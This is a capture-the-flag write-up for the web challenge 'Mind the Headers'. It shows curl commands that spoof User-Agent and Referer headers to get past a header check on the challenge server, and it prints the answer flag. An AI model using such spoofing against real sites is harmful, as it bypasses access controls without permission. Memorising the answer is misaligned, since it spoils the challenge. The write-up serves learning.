# Mind the Headers Challenge Writeup

## Challenge Information
- **Name**: Mind the Headers
- **Points**: 100
- **Description**: Try to bypass my security measure on this site! http://165.227.106.113/header.php
- **Difficulty**: Easy
- **Flag Format**: JKKNIUCTF{s0m3_t3xt}

## Initial Analysis
The challenge name "Mind the Headers" strongly hints that we need to manipulate HTTP headers to bypass security measures on the target website. The provided hint also mentioned that we need a "referer" [sic], further confirming that header manipulation is the key to solving this challenge.

## Solution Process

### Step 1: Initial Reconnaissance
I began by making a basic request to understand what we're dealing with:

```bash
curl http://165.227.106.113/header.php
```

This returned an error message:
```
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/8.9.1
<!-- Sup3rS3cr3tAg3nt  -->
```

The server is checking the User-Agent header and rejecting our request. Interestingly, there's an HTML comment that appears to reveal the expected User-Agent: `Sup3rS3cr3tAg3nt`.

### Step 2: Setting the Correct User-Agent
Based on the hint in the HTML comment, I modified the request to use the correct User-Agent:

```bash
curl -A "Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php
```

This resulted in a new error message:
```
Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
<!-- Sup3rS3cr3tAg3nt  -->
```

### Step 3: Adding the Referer Header
Now the server was checking for a Referer header (as mentioned in the hint) indicating that the request came from "awesomesauce.com". I tried several variations:

First with http:// prefix:
```bash
curl -A "Sup3rS3cr3tAg3nt" -H "Referer: http://awesomesauce.com" http://165.227.106.113/header.php
```

Then with https:// prefix:
```bash
curl -A "Sup3rS3cr3tAg3nt" -H "Referer: https://awesomesauce.com" http://165.227.106.113/header.php
```

Both of these attempts failed with the same error message.

### Step 4: Finding the Correct Referer Format
Finally, I tried using just the domain name without any protocol prefix:

```bash
curl -A "Sup3rS3cr3tAg3nt" -H "Referer: awesomesauce.com" http://165.227.106.113/header.php
```

This worked! The server returned the flag:
```
Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
```

## Key Concepts
This challenge demonstrates:
1. HTTP header-based access controls
2. How easily such controls can be bypassed
3. The importance of not relying solely on HTTP headers for security measures, as they can be easily manipulated by users

## Flag
The flag for this challenge is: `flag{did_this_m3ss_with_y0ur_h34d}`